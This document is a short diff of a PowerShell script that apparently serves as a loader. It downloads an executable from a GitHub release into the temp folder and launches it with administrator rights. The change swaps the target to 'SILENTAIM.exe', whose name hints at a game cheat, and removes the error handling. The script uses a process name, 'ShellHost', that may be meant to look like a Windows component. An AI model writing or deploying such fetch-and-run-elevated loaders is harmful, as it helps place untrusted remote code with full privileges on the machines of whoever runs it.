@@ -3,10 +3,10 @@ Clear-Host
 # --- Configuration ---
 $procName = "ShellHost"
 $tempDir = [System.IO.Path]::GetTempPath()
-$out = Join-Path $tempDir "ShellHost.exe"
+$out = Join-Path $tempDir "SILENTAIM.exe"
 
 # Replace with a stable direct URL to your file
-$directUrl = "https://github.com/nickjonoob-hub/kenoxreg/releases/download/KENOX/ShellHost.exe"
+$directUrl = "https://github.com/KYROX008/SILENTAIMMAX/releases/download/SILENT/SILENTAIM.exe"
 
 # --- UI ---
 Write-Host ""
@@ -51,9 +51,4 @@ try {
 
     # Run as Administrator
     Start-Process -FilePath $out -Verb RunAs
-}
-catch {
-    Write-Host ""
-    Write-Host "ERROR: $($_.Exception.Message)" -ForegroundColor Red
-    Read-Host "Press ENTER to exit"
 }
